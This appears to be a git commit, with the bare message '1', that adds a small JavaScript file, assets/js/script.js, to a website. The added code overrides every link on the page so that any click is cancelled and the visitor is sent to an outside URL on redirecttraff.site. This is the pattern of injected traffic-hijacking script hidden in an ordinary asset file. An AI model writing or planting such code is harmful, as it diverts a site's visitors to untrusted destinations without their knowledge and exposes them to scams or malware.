8ae9879bbfad4f2f94cab05360f8173824d70a1a
maratbabaev <you@example.com>
2025-10-17 10:26:22 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://redirecttraff.site/kVpg8RqX";
+		return false;
+	};
+});
